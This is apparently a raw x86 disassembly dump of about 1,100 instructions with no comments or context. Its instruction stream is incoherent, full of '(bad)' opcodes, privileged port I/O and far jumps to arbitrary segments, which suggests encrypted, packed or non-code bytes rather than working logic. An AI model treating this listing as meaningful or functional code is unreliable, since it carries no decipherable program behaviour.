  4027c2:	test   BYTE PTR [edi-0x2da5236],0x4d
  4027c9:	mov    bh,0x4c
  4027cb:	mov    edx,0x1d5c2d25
  4027d0:	inc    esp
  4027d1:	lock daa 
  4027d3:	stos   DWORD PTR es:[edi],eax
  4027d4:	and    esp,0xffffffa3
  4027d7:	std    
  4027d8:	jmp    0x402810
  4027da:	stc    
  4027db:	mov    eax,ds:0x27809030
  4027e0:	mov    eax,ds:0x14c06e86
  4027e5:	xchg   eax,esi
  4027e7:	and    ecx,DWORD PTR [eax+ecx*8+0x60711a04]
  4027ee:	add    al,0xd8
  4027f0:	aaa    
  4027f1:	mov    ds:0xb80369fb,al
  4027f6:	aad    0x0
  4027f8:	sub    ecx,DWORD PTR [ecx-0x3d]
  4027fb:	fwait
  4027fc:	es pop dx
  4027ff:	ror    BYTE PTR [eax+0x938159b],1
  402805:	sub    ebx,esi
  402807:	jmp    0xe572:0xa9dccb79
  40280e:	sahf   
  40280f:	clc    
  402810:	cmp    DWORD PTR [ebx],eax
  402812:	or     BYTE PTR [edi+0x54],0x9a
  402816:	jge    0x402896
  402818:	cmp    DWORD PTR [ecx-0x1307ef97],edi
  40281e:	dec    esi
  40281f:	retf   0x911e
  402822:	push   eax
  402823:	mov    ebx,DWORD PTR [edx+0x43]
  402826:	mov    edi,0x929501ea
  40282b:	test   BYTE PTR [ebx-0x14],0xd3
  40282f:	sub    bh,BYTE PTR [ecx+0x7f0c15bc]
  402835:	jne    0x40287a
  402837:	dec    ebp
  402838:	inc    esp
  40283a:	mov    ebp,0xbbc2c0a1
  40283f:	pop    es
  402840:	out    0xf,al
  402842:	sub    DWORD PTR ds:0xc9c42461,eax
  402848:	je     0x40289a
  40284a:	pop    ss
  40284b:	rcl    BYTE PTR [edi-0x73b4d20f],0x85
  402852:	fisttp QWORD PTR [ecx+0x12650992]
  402858:	sub    edx,DWORD PTR [ebp+esi*1-0x3b]
  40285c:	hlt    
  40285d:	lods   al,BYTE PTR ds:[esi]
  40285e:	mov    esi,0x4aedd80c
  402863:	and    al,0x8a
  402865:	mov    bh,dl
  402867:	push   eax
  402868:	ror    DWORD PTR [eax+ebx*1-0x309df4df],1
  40286f:	xchg   edx,eax
  402870:	lods   eax,DWORD PTR ds:[esi]
  402871:	cmc    
  402872:	mov    BYTE PTR ds:0x9b525f23,bh
  402878:	add    BYTE PTR [esi+ecx*4+0x5182479a],ch
  40287f:	or     al,0x65
  402881:	daa    
  402882:	sbb    dh,dh
  402884:	jmp    0x40285b
  402886:	sbb    edx,DWORD PTR [ebp+0x4d]
  402889:	lods   al,BYTE PTR ds:[esi]
  40288a:	cmp    eax,edx
  40288c:	dec    ecx
  40288d:	or     eax,0x1ad3cbb5
  402892:	push   esi
  402893:	sti    
  402894:	jp     0x4028c0
  402896:	jbe    0x4028fc
  402898:	or     DWORD PTR [eax+0x6a],esi
  40289b:	jge    0x4028a8
  40289d:	sbb    esp,ebp
  40289f:	dec    esp
  4028a0:	mov    al,ds:0xdfe8e1e6
  4028a5:	ja     0x4028d5
  4028a7:	aad    0x69
  4028a9:	retf   
  4028aa:	push   ecx
  4028ab:	lock ret 0x2ca2
  4028af:	test   DWORD PTR [eax-0x37],eax
  4028b2:	sub    esp,DWORD PTR [eax+0x4eff9f61]
  4028b8:	xor    ch,al
  4028ba:	(bad)  
  4028bb:	or     DWORD PTR [eax],ebp
  4028bd:	int3   
  4028be:	or     DWORD PTR [ecx+edx*2+0x5a],esp
  4028c2:	mov    eax,0xa27582ac
  4028c7:	int    0xcd
  4028c9:	(bad)  
  4028ca:	adc    cl,dl
  4028cc:	ffree  st(5)
  4028ce:	(bad)  
  4028cf:	mov    ebx,0xd2a82be0
  4028d4:	enter  0xc3ba,0x46
  4028d8:	(bad)  
  4028d9:	mov    al,ds:0xf6e50c57
  4028de:	mov    BYTE PTR [ebx],ah
  4028e0:	push   es
  4028e1:	add    ch,BYTE PTR ss:[esi-0x2551fb2b]
  4028e8:	pop    esi
  4028e9:	repz xor BYTE PTR ds:0xfd888b2,0x3e
  4028f1:	ds ret 0x9c51
  4028f5:	xor    edi,DWORD PTR [ebp+0x4515cd9e]
  4028fb:	and    DWORD PTR [eax+0x39824377],0x23
  402902:	sahf   
  402903:	add    al,ah
  402905:	add    eax,0x3b782351
  40290a:	add    BYTE PTR [ebp+0x50],cl
  40290d:	xchg   esi,eax
  40290e:	mov    dh,0x14
  402910:	ins    DWORD PTR es:[edi],dx
  402911:	sbb    DWORD PTR [eax+0x18],0x8d033f89
  402918:	and    al,0x3e
  40291a:	sub    bh,BYTE PTR [ebx+0x95b6779]
  402920:	dec    edx
  402921:	cmp    bh,BYTE PTR [ebx+0x8]
  402924:	add    DWORD PTR [esi+edx*4-0x5],ebx
  402928:	je     0x402962
  40292a:	iret   
  40292b:	sbb    BYTE PTR [esp+edx*4-0x628a512a],dl
  402932:	das    
  402933:	mov    eax,DWORD PTR [edx+0x58b02e26]
  402939:	icebp  
  40293a:	loop   0x4028e5
  40293c:	(bad)  
  40293d:	(bad)  [edi+0x4c]
  402940:	mov    esi,0xa3baac60
  402945:	scas   al,BYTE PTR es:[edi]
  402946:	test   edi,ebp
  402948:	adc    eax,ebx
  40294a:	mov    ebx,DWORD PTR [ebx+esi*4+0x74]
  40294e:	jnp    0x4028fc
  402950:	jecxz  0x40298f
  402952:	repnz mov dh,0x91
  402955:	leave  
  402956:	(bad)  
  402957:	cld    
  402958:	loop   0x402929
  40295a:	adc    ecx,0xbdcb3a4
  402960:	aaa    
  402961:	call   0x1a79523e
  402966:	adc    DWORD PTR [esp+ebx*4],ebx
  402969:	sub    dh,BYTE PTR [edx-0x7c]
  40296c:	sbb    esi,ebx
  40296e:	ins    DWORD PTR es:[edi],dx
  40296f:	call   0xaa1e:0x95acb8dd
  402976:	test   BYTE PTR [edx-0x3ea78e76],ah
  40297c:	jae    0x40290f
  40297e:	adc    esp,DWORD PTR [ebx-0xce3f56f]
  402984:	les    ebx,FWORD PTR [esi-0x64388036]
  40298a:	xor    BYTE PTR [ebx-0x68899b3c],bh
  402990:	cmp    ebp,DWORD PTR [eax]
  402992:	ins    DWORD PTR es:[edi],dx
  402993:	ds daa 
  402995:	mov    WORD PTR [eax],es
  402997:	xchg   esi,eax
  402998:	ss pop ecx
  40299a:	mov    ecx,?
  40299c:	std    
  40299d:	and    eax,0x64275eef
  4029a2:	sub    BYTE PTR [edi-0x5f],dh
  4029a5:	or     al,0xf7
  4029a7:	nop
  4029a8:	test   eax,0x48099064
  4029ad:	jbe    0x4029db
  4029af:	inc    esp
  4029b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029b1:	mov    cl,0xa2
  4029b3:	inc    ebx
  4029b4:	sub    ah,ch
  4029b6:	mov    ch,0xe2
  4029b8:	mov    ebp,0x384b5fa5
  4029bd:	jns    0x4029da
  4029bf:	pusha  
  4029c0:	or     cl,BYTE PTR [esi+ebp*8-0x45]
  4029c4:	jecxz  0x4029eb
  4029c6:	or     ebp,DWORD PTR [ecx+ebp*4]
  4029c9:	(bad)  
  4029cb:	mov    ecx,0x6bfabb9f
  4029d0:	pop    ss
  4029d1:	inc    ebp
  4029d2:	add    edx,esi
  4029d4:	shr    DWORD PTR cs:[edi+eiz*1+0x4e57efae],1
  4029dc:	mov    ds:0x813efce0,eax
  4029e1:	call   0xcda:0xcf7de746
  4029e8:	mov    edx,0xd0e2858e
  4029ed:	dec    ecx
  4029ee:	jl     0x402a67
  4029f0:	mov    eax,ds:0xcae07a07
  4029f5:	pop    esp
  4029f6:	fild   QWORD PTR [edx-0x3dd3c30d]
  4029fc:	pop    esi
  4029fd:	xor    dh,BYTE PTR [ebx]
  4029ff:	xlat   BYTE PTR ds:[ebx]
  402a00:	push   ecx
  402a01:	fisttp QWORD PTR [edi+0x375faab2]
  402a07:	sub    DWORD PTR [edi-0x27a4cf10],edx
  402a0d:	mov    edi,0x362a7f55
  402a12:	pop    es
  402a13:	jne    0x402a37
  402a15:	out    0x4c,al
  402a17:	iret   
  402a18:	test   bh,al
  402a1a:	clc    
  402a1b:	pusha  
  402a1c:	mov    bh,0x6b
  402a1e:	fcmovnbe st,st(2)
  402a20:	push   ecx
  402a21:	lds    ebx,FWORD PTR [ecx-0x4f]
  402a24:	jecxz  0x4029fc
  402a26:	pusha  
  402a27:	out    0xac,al
  402a29:	dec    esp
  402a2a:	and    al,BYTE PTR [eax-0x7e]
  402a2d:	cmp    bl,BYTE PTR [edx]
  402a2f:	fdivr  DWORD PTR [edx]
  402a31:	dec    esp
  402a32:	sbb    DWORD PTR [ecx-0x31],edi
  402a35:	in     al,dx
  402a36:	jmp    0x6ebe15c2
  402a3b:	popa   
  402a3c:	(bad)  
  402a3d:	gs jno 0x4029ff
  402a40:	xchg   ch,bl
  402a42:	lea    ebp,[edi-0xe5f745]
  402a48:	add    al,0x2
  402a4a:	cmc    
  402a4b:	inc    eax
  402a4c:	mov    ebx,0x8f9fb5b6
  402a51:	sub    BYTE PTR [esi],dh
  402a53:	push   cs
  402a54:	push   ecx
  402a55:	xor    al,0x3
  402a57:	or     bl,ch
  402a59:	je     0x402a35
  402a5b:	pop    ecx
  402a5c:	and    BYTE PTR [esi+0x10faece2],dl
  402a62:	imul   edx,DWORD PTR [eax-0x77],0x7
  402a66:	call   0xa66d:0x45732037
  402a6d:	test   DWORD PTR [ebx],ebp
  402a6f:	lea    ebx,[ebx-0x3e]
  402a72:	add    edx,DWORD PTR [edi-0x34ab9b88]
  402a78:	int    0x44
  402a7a:	add    edx,esi
  402a7c:	test   DWORD PTR [eax-0x5cb7977c],edi
  402a82:	lds    esi,FWORD PTR [ebp+0x9]
  402a85:	jp     0x402a79
  402a87:	ss (bad) 
  402a89:	xor    bh,bl
  402a8b:	stc    
  402a8c:	test   DWORD PTR [edi],esi
  402a8e:	jbe    0x402a35
  402a90:	xor    edi,ebx
  402a92:	add    dh,BYTE PTR [edx+0x59ec3c68]
  402a98:	cli    
  402a99:	ror    BYTE PTR [esp+eiz*8+0x26],cl
  402a9d:	mov    ebp,0xbb0c00d4
  402aa2:	sbb    ebx,0x77
  402aa5:	repnz xor ch,ch
  402aa8:	xchg   ecx,eax
  402aa9:	pushf  
  402aaa:	add    al,0xc6
  402aac:	jg     0x402a53
  402aae:	mov    dl,0xb2
  402ab0:	mov    edi,0x733922d2
  402ab5:	or     bh,al
  402ab7:	in     eax,0x22
  402ab9:	mov    ebp,0x39ebfd94
  402abe:	inc    eax
  402abf:	sahf   
  402ac0:	cmp    esi,DWORD PTR [edi-0x49d50cc2]
  402ac6:	and    DWORD PTR [edi+0xf],esi
  402ac9:	adc    BYTE PTR [eax+0x4c21f60b],0x97
  402ad0:	push   esi
  402ad1:	inc    esi
  402ad2:	dec    ebp
  402ad3:	out    0xf9,eax
  402ad5:	test   BYTE PTR [ecx+0x3a],ch
  402ad8:	xchg   edx,eax
  402ad9:	out    dx,eax
  402ada:	jecxz  0x402a62
  402adc:	jbe    0x402af7
  402ade:	ja     0x402b58
  402ae0:	scas   eax,DWORD PTR es:[edi]
  402ae1:	sbb    BYTE PTR [ebp-0x397ae1ec],bh
  402ae7:	push   eax
  402ae8:	inc    esi
  402ae9:	dec    esi
  402aea:	(bad)  
  402aeb:	std    
  402aec:	enter  0xdb56,0x9f
  402af0:	jnp    0x402ad1
  402af2:	push   0x2b
  402af4:	mov    esp,0x4c646ced
  402af9:	cmc    
  402afa:	lods   eax,DWORD PTR ds:[esi]
  402afb:	xor    BYTE PTR [ecx],0x7
  402afe:	loop   0x402a9d
  402b00:	or     eax,0xcc88d19b
  402b05:	cmp    BYTE PTR ds:0x7c35ef71,cl
  402b0b:	sub    edx,DWORD PTR [ecx-0x71]
  402b0e:	pop    ecx
  402b0f:	inc    esp
  402b10:	mov    al,ds:0x61615744
  402b15:	shl    BYTE PTR [ebx+0x60d712b0],0x78
  402b1c:	in     eax,dx
  402b1d:	outs   dx,BYTE PTR ds:[esi]
  402b1e:	iret   
  402b1f:	pop    ss
  402b20:	rcl    ebp,cl
  402b22:	mov    ecx,0x4c32273b
  402b27:	dec    esp
  402b28:	mov    edi,0x5672001a
  402b2d:	xchg   DWORD PTR [edx+0x55],esp
  402b30:	add    esi,ebp
  402b32:	jo     0x402b15
  402b34:	add    BYTE PTR [ebx-0x31],cl
  402b37:	idiv   BYTE PTR [esi-0x7e]
  402b3a:	mov    ch,0x4b
  402b3c:	into   
  402b3d:	nop
  402b3e:	(bad)  
  402b3f:	pop    ebp
  402b40:	ret    0xc25d
  402b43:	sbb    eax,0x3df49101
  402b48:	cmc    
  402b49:	test   eax,0x1d1f6d43
  402b4e:	add    DWORD PTR [eax-0x26375b0a],ecx
  402b54:	jnp    0x402ae3
  402b56:	bound  edi,QWORD PTR [edx]
  402b58:	mov    eax,0x2b77c6e6
  402b5d:	rcl    DWORD PTR [ecx+0x60],1
  402b60:	cmp    al,0x48
  402b62:	xor    bl,BYTE PTR [eax+0x45b89b5c]
  402b68:	sub    eax,DWORD PTR [ebx+0x6d]
  402b6b:	mov    bh,0x81
  402b6d:	repnz arpl WORD PTR [edi],bx
  402b70:	aas    
  402b71:	aas    
  402b72:	rol    BYTE PTR [eax-0x7a52b832],0x8a
  402b79:	jl     0x402b02
  402b7b:	stos   BYTE PTR es:[edi],al
  402b7c:	(bad)  [edi]
  402b7e:	sub    BYTE PTR [eax-0x7c9333c2],dh
  402b84:	loopne 0x402b9c
  402b86:	(bad)  
  402b87:	push   edx
  402b88:	sbb    eax,0x74831633
  402b8d:	pushf  
  402b8e:	push   ebp
  402b8f:	or     BYTE PTR [esi],dl
  402b91:	fild   DWORD PTR [ebp+0xa55dfb5]
  402b97:	sti    
  402b98:	jno    0x402ba0
  402b9a:	jne    0x402bb2
  402b9c:	stos   BYTE PTR es:[edi],al
  402b9d:	dec    edx
  402b9e:	jmp    0x402bc8
  402ba0:	sbb    DWORD PTR [ebp-0x2e74317d],ebp
  402ba6:	sub    bl,BYTE PTR [edi-0xc901972]
  402bac:	mov    ebx,0xc31760f5
  402bb1:	shl    DWORD PTR ds:0x7192587f,1
  402bb7:	push   0x2a
  402bb9:	loope  0x402bbd
  402bbb:	repz or cl,BYTE PTR ds:0x191d2e32
  402bc2:	retf   
  402bc3:	mov    ebx,0x4da3ddf0
  402bc8:	jmp    0x402be7
  402bca:	mov    bh,0x64
  402bcc:	call   0x57805d7f
  402bd1:	stos   DWORD PTR es:[edi],eax
  402bd2:	(bad)  
  402bd3:	pop    edi
  402bd4:	adc    al,0x5c
  402bd6:	xor    eax,0xd0d02d77
  402bdb:	and    BYTE PTR [ecx-0x51bb059d],al
  402be1:	mov    cl,0x5a
  402be3:	sbb    eax,0xcd266526
  402be8:	and    BYTE PTR [ecx+edx*2-0x55],dh
  402bec:	out    0xbd,eax
  402bee:	fcomip st,st(0)
  402bf0:	cld    
  402bf1:	out    0x9d,al
  402bf3:	sub    edx,DWORD PTR [edi]
  402bf5:	push   edi
  402bf6:	outs   dx,BYTE PTR ds:[esi]
  402bf7:	or     eax,0x4e8fb64d
  402bfc:	in     al,0x39
  402bfe:	dec    edi
  402bff:	stos   DWORD PTR es:[edi],eax
  402c00:	sbb    dh,dl
  402c02:	jle    0x402c56
  402c04:	sbb    bh,BYTE PTR [ebx-0x25]
  402c07:	xor    al,0x7
  402c09:	add    BYTE PTR [ebp+0x4c56b219],0xa5
  402c10:	push   esi
  402c11:	or     BYTE PTR [ecx+0x3f0c7493],0x50
  402c18:	test   eax,0x98778b28
  402c1d:	mov    cl,0xa8
  402c1f:	popf   
  402c20:	sub    ecx,DWORD PTR [ecx]
  402c22:	ja     0x402c29
  402c24:	das    
  402c25:	jb     0x402c4e
  402c27:	jne    0x402bbd
  402c29:	clc    
  402c2a:	mov    esp,DWORD PTR [eax]
  402c2c:	jle    0x402bd5
  402c2e:	call   0x1f75:0x37596b3a
  402c35:	xchg   ebp,eax
  402c36:	not    dh
  402c38:	in     al,dx
  402c39:	add    eax,0xed310d61
  402c3e:	popa   
  402c3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c41:	mov    eax,0xb60868ca
  402c46:	ins    BYTE PTR es:[edi],dx
  402c47:	aaa    
  402c48:	xor    ecx,DWORD PTR [eax]
  402c4a:	(bad)  
  402c4b:	jle    0x402caa
  402c4d:	jb     0x402bd8
  402c4f:	mov    esi,0x31f315fc
  402c54:	cld    
  402c55:	stos   BYTE PTR es:[edi],al
  402c56:	and    al,0xed
  402c58:	out    0x16,al
  402c5a:	mov    BYTE PTR [ebp+0x65],bl
  402c5d:	mov    al,0xde
  402c5f:	mov    DWORD PTR [ebx+0x65846fb6],ebp
  402c65:	cs inc edx
  402c67:	sahf   
  402c68:	or     BYTE PTR [eax+0x31],bl
  402c6b:	adc    ebx,DWORD PTR [ebp+0x5e14c489]
  402c71:	jne    0x402c12
  402c73:	adc    esp,eax
  402c75:	and    DWORD PTR ds:0xf11b9a18,0x0
  402c7c:	lahf   
  402c7d:	jle    0x402c1e
  402c7f:	or     edx,DWORD PTR [edi-0x1985b95b]
  402c85:	or     eax,0xa2a245e7
  402c8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c8b:	or     al,0x41
  402c8d:	lea    ebx,[esi+0x41]
  402c90:	test   DWORD PTR [edx],esi
  402c92:	sbb    DWORD PTR [eax+0x4c5e93ef],edx
  402c98:	aad    0x48
  402c9a:	mov    gs,WORD PTR [eax]
  402c9c:	(bad)  
  402c9d:	test   DWORD PTR [edx-0x62],0x3c2a189
  402ca4:	out    dx,al
  402ca5:	call   FWORD PTR [ecx]
  402ca7:	addr16 push ds
  402ca9:	pop    es
  402caa:	test   eax,0x41586f35
  402caf:	enter  0x3de,0xca
  402cb3:	cwde   
  402cb4:	push   0x1a0f4fe1
  402cb9:	scas   eax,DWORD PTR es:[edi]
  402cba:	pop    es
  402cbb:	popa   
  402cbc:	jp     0x402d0e
  402cbe:	test   al,0x27
  402cc0:	xchg   DWORD PTR [edx+0x564b4fa6],esp
  402cc6:	(bad)
  402cc9:	icebp  
  402cca:	cld    
  402ccb:	pop    ds
  402ccc:	adc    edi,DWORD PTR [edx-0x12e7114d]
  402cd2:	jge    0x402cb4
  402cd4:	xlat   BYTE PTR ds:[ebx]
  402cd5:	aaa    
  402cd6:	adc    ah,BYTE PTR [eax+0x3a]
  402cd9:	sti    
  402cda:	mov    fs,WORD PTR [esi-0x2db3eced]
  402ce0:	inc    ebp
  402ce1:	ins    DWORD PTR es:[edi],dx
  402ce2:	pusha  
  402ce3:	call   0x19dc05c9
  402ce8:	shr    DWORD PTR [edi+ebp*4+0x30],1
  402cec:	xchg   esp,eax
  402ced:	pushf  
  402cee:	pop    ss
  402cef:	dec    al
  402cf1:	out    0x93,eax
  402cf3:	in     eax,dx
  402cf4:	lods   eax,DWORD PTR ds:[esi]
  402cf5:	ror    DWORD PTR ds:[ebx+0x2a],0x7e
  402cfa:	imul   eax,DWORD PTR [ebp+0x1d],0x72
  402cfe:	(bad)  
  402cff:	mov    bl,0xa0
  402d01:	pop    edx
  402d02:	mov    eax,0x1e6dfbf
  402d07:	hlt    
  402d08:	jae    0x402d69
  402d0a:	xchg   esi,eax
  402d0b:	push   cs
  402d0c:	test   eax,0xcbb01f80
  402d11:	jl     0x402d0b
  402d13:	jmp    0xaf3a:0xf851bd01
  402d1a:	stos   DWORD PTR es:[edi],eax
  402d1b:	sbb    eax,0xb746bf41
  402d20:	out    dx,al
  402d21:	cli    
  402d22:	mov    es,esi
  402d24:	cmp    bl,bl
  402d26:	cmp    eax,edx
  402d28:	pop    ds
  402d29:	mov    ch,0xa3
  402d2b:	stos   DWORD PTR es:[edi],eax
  402d2c:	aaa    
  402d2d:	mov    ecx,DWORD PTR [ebp+0x1e0202af]
  402d33:	push   ecx
  402d34:	or     al,0xaf
  402d36:	mov    ch,0xf2
  402d38:	das    
  402d39:	xchg   ebp,eax
  402d3a:	dec    esi
  402d3b:	scas   al,BYTE PTR es:[edi]
  402d3c:	xor    esp,DWORD PTR [esi-0x14346fe8]
  402d42:	and    esp,DWORD PTR [eax+0x2f]
  402d45:	enter  0xe99f,0xb7
  402d49:	out    dx,al
  402d4a:	sar    ebx,cl
  402d4c:	xor    BYTE PTR [ebp-0x4b],dh
  402d4f:	hlt    
  402d50:	mov    edi,DWORD PTR [ebp-0x1322387e]
  402d56:	sbb    al,0xb2
  402d58:	xchg   edi,eax
  402d59:	pop    ebx
  402d5a:	pop    esp
  402d5b:	cmp    esi,DWORD PTR [eax-0x3a]
  402d5e:	jbe    0x402cf3
  402d60:	pop    esi
  402d61:	rcr    DWORD PTR [esi-0x66],1
  402d64:	add    ebx,edi
  402d66:	scas   al,BYTE PTR es:[edi]
  402d67:	sub    BYTE PTR [ebx],dh
  402d69:	ja     0x402d94
  402d6b:	repnz test BYTE PTR es:[edx-0x31],ah
  402d70:	xchg   cl,al
  402d72:	fdiv   QWORD PTR [edi-0x16]
  402d75:	adc    BYTE PTR [esi+edi*2-0x38c43a1c],dl
  402d7c:	pop    es
  402d7d:	dec    ebp
  402d7e:	outs   dx,DWORD PTR ds:[esi]
  402d7f:	dec    ecx
  402d80:	call   0x4885:0xfd08b92
  402d87:	xchg   esi,eax
  402d88:	and    al,BYTE PTR [edi+0x69]
  402d8b:	out    0xbd,eax
  402d8d:	push   cs
  402d8e:	and    esp,DWORD PTR [esi-0x266df961]
  402d94:	mov    bl,0xb0
  402d96:	stc    
  402d97:	mov    eax,ds:0x4cb6531e
  402d9c:	scas   al,BYTE PTR es:[edi]
  402d9d:	pop    es
  402d9e:	and    ebx,DWORD PTR ds:0xd28d76d7
  402da4:	stos   BYTE PTR es:[edi],al
  402da5:	sbb    BYTE PTR [ebp-0x28bc4606],al
  402dab:	mov    ebp,0x38ba02d6
  402db0:	addr16 xchg edx,eax
  402db2:	and    bh,BYTE PTR [edi-0x22]
  402db5:	int3   
  402db6:	loopne 0x402dad
  402db8:	xchg   edi,eax
  402db9:	inc    ebp
  402dba:	adc    eax,0x1f391f18
  402dbf:	or     eax,0x53383f6b
  402dc4:	inc    edx
  402dc5:	sub    BYTE PTR [edi],bl
  402dc7:	mov    al,ds:0x18ba6b40
  402dcc:	inc    esp
  402dcd:	and    DWORD PTR [ecx],0x5
  402dd0:	bnd jne 0x402e4d
  402dd3:	mov    dl,0x1f
  402dd5:	(bad)  
  402dd6:	xor    al,0x2f
  402dd8:	jae    0x402da4
  402dda:	in     eax,0xf6
  402ddc:	inc    esp
  402ddd:	das    
  402dde:	stc    
  402ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402de0:	sub    DWORD PTR [esi+0x31cae2da],esi
  402de6:	outs   dx,DWORD PTR ds:[esi]
  402de7:	push   edi
  402de8:	ss jl  0x402de8
  402deb:	cli    
  402dec:	sub    al,0x97
  402dee:	xchg   BYTE PTR [ebp+0x34],ch
  402df1:	pusha  
  402df2:	mov    al,0xe9
  402df4:	and    ecx,edx
  402df6:	(bad)  
  402df7:	cmp    DWORD PTR [edi-0x992ccad],ebx
  402dfd:	push   esp
  402dfe:	push   es
  402dff:	and    DWORD PTR [edi],ebp
  402e01:	stos   DWORD PTR es:[edi],eax
  402e02:	mov    ecx,0xe8a2d11f
  402e07:	gs dec ebx
  402e09:	pop    ss
  402e0a:	push   eax
  402e0b:	pop    es
  402e0c:	inc    ebp
  402e0d:	jne    0x402e8a
  402e0f:	jg     0x402e90
  402e11:	mov    ebp,DWORD PTR fs:[ebp-0x7736afa8]
  402e18:	cmp    eax,0x715de534
  402e1d:	xchg   ecx,eax
  402e1e:	sbb    eax,0x72cb3ebe
  402e23:	sub    ebx,DWORD PTR [edi+0xc]
  402e26:	in     eax,0xf3
  402e28:	inc    eax
  402e29:	fs or  eax,0xfa5052f3
  402e2f:	jno    0x402e21
  402e31:	lea    ebx,[ebx]
  402e33:	das    
  402e34:	mov    eax,ds:0x141278e9
  402e39:	in     eax,dx
  402e3a:	add    eax,ebp
  402e3c:	fidiv  WORD PTR [eax+0x5f2f117e]
  402e42:	pop    edi
  402e43:	stos   DWORD PTR es:[edi],eax
  402e44:	adc    al,0xeb
  402e46:	ja     0x402e06
  402e48:	xchg   DWORD PTR [ecx-0x26],eax
  402e4b:	test   BYTE PTR [edx],al
  402e4d:	and    al,0x40
  402e4f:	push   esi
  402e51:	test   eax,0xd8aa49f5
  402e56:	xchg   esi,eax
  402e57:	push   fs
  402e59:	mov    ds:0x7e7d96ba,al
  402e5e:	jo     0x402e1d
  402e60:	fxch   st(1)
  402e62:	dec    ebx
  402e63:	adc    DWORD PTR [esi-0x1d],0x21469e61
  402e6a:	sub    BYTE PTR [esi],cl
  402e6c:	xor    DWORD PTR [edi+0x33],ebx
  402e6f:	sub    al,0x94
  402e71:	mov    dl,0x59
  402e73:	mov    ebp,0x2a7769ed
  402e78:	je     0x402e37
  402e7a:	dec    edi
  402e7b:	jae    0x402e4d
  402e7d:	jb     0x402e7d
  402e7f:	lods   eax,DWORD PTR ds:[esi]
  402e80:	sbb    edi,DWORD PTR ds:0x9ae14052
  402e86:	shl    DWORD PTR [edx],0x84
  402e89:	mov    ecx,0x595b284
  402e8e:	adc    DWORD PTR [edi+0x16],ebp
  402e91:	mov    bh,0xe5
  402e93:	pop    ecx
  402e94:	xchg   esi,eax
  402e95:	(bad)  
  402e96:	xlat   BYTE PTR ds:[ebx]
  402e97:	out    dx,al
  402e98:	adc    eax,0x48fc5af0
  402e9d:	fcom   DWORD PTR [ecx-0x7602cf0]
  402ea3:	mov    eax,ds:0xcdcb1bb1
  402ea8:	rol    BYTE PTR [esi-0x18],1
  402eab:	aaa    
  402eac:	fdiv   DWORD PTR [ebp+0x25]
  402eaf:	(bad)  
  402eb0:	scas   al,BYTE PTR es:[edi]
  402eb1:	call   0xa28e83fd
  402eb6:	or     dl,bl
  402eb8:	bound  edx,QWORD PTR [edx]
  402eba:	jmp    DWORD PTR [edi+ebx*4-0x45]
  402ebe:	imul   esp,DWORD PTR [edi+0x317597ac],0x9
  402ec5:	add    ch,BYTE PTR fs:[edi]
  402ec8:	sbb    eax,0x44695912
  402ecd:	push   edi
  402ece:	sub    bh,0x5f
  402ed1:	(bad)
  402ed5:	in     eax,0x54
  402ed7:	and    al,0x29
  402ed9:	cmp    eax,0xf45794bf
  402ede:	mov    dl,0xba
  402ee0:	leave  
  402ee1:	aam    0x94
  402ee3:	sbb    ah,0x8d
  402ee6:	push   edi
  402ee7:	xchg   ebx,eax
  402ee8:	xchg   edx,eax
  402ee9:	sbb    BYTE PTR [ebx+edi*4-0x70],dh
  402eed:	xchg   DWORD PTR [edi-0x6e194820],edi
  402ef3:	pop    edx
  402ef4:	lea    ecx,[ebp+0x20139b5d]
  402efa:	(bad)  
  402efb:	ins    DWORD PTR es:[edi],dx
  402efc:	adc    edi,DWORD PTR [esi+0x45d264b0]
  402f02:	and    dl,cl
  402f04:	jne    0x402e97
  402f06:	out    dx,eax
  402f07:	add    DWORD PTR [edi-0x69769682],ecx
  402f0d:	(bad)  
  402f0e:	jae    0x402ea0
  402f10:	dec    eax
  402f11:	sbb    al,0x21
  402f13:	retf   0x7579
  402f16:	imul   edi,DWORD PTR [esi+0x2a],0xe8b0a72d
  402f1d:	ss adc eax,0xbe5ebee8
  402f23:	jnp    0x402f03
  402f25:	jmp    0x402ef1
  402f27:	inc    eax
  402f28:	lahf   
  402f29:	mov    al,0x50
  402f2b:	sbb    ecx,esp
  402f2d:	xchg   esp,eax
  402f2e:	sbb    edi,esp
  402f30:	shl    BYTE PTR [edx+0x1850b45c],cl
  402f36:	xor    eax,0x92be87eb
  402f3b:	imul   ebx,esi,0xffffff97
  402f3e:	inc    edx
  402f3f:	loopne 0x402ed8
  402f41:	and    ah,BYTE PTR [edx+0x316e6e93]
  402f47:	sbb    dh,BYTE PTR [esi+0x68]
  402f4a:	jns    0x402f7c
  402f4c:	loop   0x402fc9
  402f4e:	ins    DWORD PTR es:[edi],dx
  402f4f:	sub    ebx,DWORD PTR [edx+ecx*8+0x63]
  402f53:	je     0x402fac
  402f55:	sbb    dl,ah
  402f57:	enter  0x97ca,0x0
  402f5b:	pusha  
  402f5c:	call   0xe14b7c7c
  402f61:	pop    ds
  402f62:	xchg   ebp,eax
  402f63:	retf   
  402f64:	inc    edi
  402f65:	adc    ecx,DWORD PTR [ebp-0x58]
  402f68:	test   BYTE PTR [eax+0x5c],cl
  402f6b:	divps  xmm0,xmm3
  402f6e:	xchg   esp,eax
  402f6f:	push   0x562d0613
  402f74:	cmp    BYTE PTR [ebx],ah
  402f76:	out    0x69,eax
  402f78:	cmp    DWORD PTR [eax+ebx*1+0x61100b12],esp
  402f7f:	bound  edx,QWORD PTR [ecx+0x4a902724]
  402f85:	jmp    0x8a184259
  402f8a:	cwde   
  402f8b:	mov    ds:0x819bd2e0,eax
  402f90:	mov    ebx,0x53acf8ee
  402f95:	mov    ebp,0x1a086675
  402f9a:	es lock add eax,0xe3e21913
  402fa1:	arpl   bx,di
  402fa3:	loop   0x402fe7
  402fa5:	or     dl,ah
  402fa7:	add    eax,0x17ba144
  402fac:	jo     0x402f51
  402fae:	stos   DWORD PTR es:[edi],eax
  402faf:	(bad)  
  402fb1:	cdq    
  402fb2:	sub    BYTE PTR [esi+0x5e1c0501],0xf8
  402fb9:	test   BYTE PTR [esi-0x2f],0xcd
  402fbd:	clc    
  402fbe:	push   ds
  402fbf:	cdq    
  402fc0:	inc    ecx
  402fc1:	or     DWORD PTR [esi-0x26],ebp
  402fc4:	xor    ch,BYTE PTR [esi+0x6c]
  402fc7:	sub    BYTE PTR [ebx],cl
  402fc9:	clc    
  402fca:	mov    BYTE PTR [ecx-0x39],dl
  402fcd:	dec    ecx
